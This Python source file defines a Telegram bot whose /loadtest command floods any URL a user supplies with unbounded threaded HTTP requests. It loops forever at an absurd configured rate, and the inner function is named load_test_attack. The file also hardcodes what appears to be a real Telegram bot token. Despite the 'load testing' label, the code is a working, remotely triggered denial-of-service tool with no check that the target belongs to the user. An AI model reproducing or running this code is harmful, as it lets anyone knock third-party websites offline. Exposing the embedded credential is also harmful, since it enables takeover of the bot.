from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import requests
import threading
import logging
import time

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)


TOKEN = '7242864870:AAEahRqzIRwdDkMeToF_GgWSZp2QOt9Z1Zc'

# Configuration
REQUESTS_PER_SECOND = 10000000000000000000000000000000000  # Number of requests to send per second
STATUS_UPDATE_INTERVAL = 10  # Number of requests after which to send status update

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Welcome to the Load Testing bot! Use /loadtest <URL> to start.')

def load_test(update: Update, context: CallbackContext) -> None:
    if len(context.args) < 1:
        update.message.reply_text('Please provide a URL.')
        return

    url = context.args[0]
    update.message.reply_text(f'Starting load test on {url}. Requests will be sent at a rate of {REQUESTS_PER_SECOND} per second.')

    def send_requests(url, chat_id, request_count):
        try:
            response = requests.get(url)
            status_code = response.status_code
            if request_count % STATUS_UPDATE_INTERVAL == 0:
                context.bot.send_message(chat_id=chat_id, text=f"Request #{request_count}: Response status code {status_code}")
        except requests.exceptions.RequestException as e:
            context.bot.send_message(chat_id=chat_id, text=f"An error occurred: {e}")

    def load_test_attack(chat_id):
        request_count = 0
        start_time = time.time()

        context.bot.send_message(chat_id=chat_id, text='Load test initiated.')

        while True:
            threads = []
            for i in range(REQUESTS_PER_SECOND):
                thread = threading.Thread(target=send_requests, args=(url, chat_id, request_count + i + 1))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            request_count += REQUESTS_PER_SECOND
            elapsed_time = time.time() - start_time
            if request_count % (STATUS_UPDATE_INTERVAL * REQUESTS_PER_SECOND) == 0:
                context.bot.send_message(chat_id=chat_id, text=f"Sent {request_count} requests so far. Elapsed time: {elapsed_time:.2f} seconds.")

            time.sleep(1)  # Maintain the rate of requests

    chat_id = update.message.chat_id
    threading.Thread(target=load_test_attack, args=(chat_id,)).start()

def main() -> None:
    updater = Updater(TOKEN)

    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("loadtest", load_test))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()